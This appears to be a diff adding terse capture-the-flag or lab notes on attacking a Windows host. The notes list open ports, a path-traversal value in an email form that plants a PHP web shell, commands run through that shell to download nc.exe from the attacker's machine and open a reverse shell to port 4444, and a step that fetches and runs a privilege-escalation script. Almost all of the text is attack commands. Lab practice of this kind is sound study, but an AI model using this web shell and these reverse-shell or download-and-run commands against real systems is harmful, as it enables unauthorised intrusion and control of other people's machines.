@@ -1,0 +1,27 @@
+H1: Medium:
+80
+81
+82
+vulnerable email form
+"../public/"@shell.php
+creates a file named “@shell.php”
+<?php system($_GET['cmd']); ?>
+10.10.203.48/@shell.php?cmd=powershell curl 10.6.15.130:8000/nc.exe -o nc.exe
+10.10.203.48/@shell.php?cmd=nc.exe -e cmd.exe 10.6.15.130 4444
+88
+135
+139
+389
+445
+464
+593
+636
+3268
+3269
+3389
+5985
+7680
+9389
+Priv Esc
+powershell curl 10.6.15.130:8000/windows-privesc-check -o priv-esc
+start priv-esc
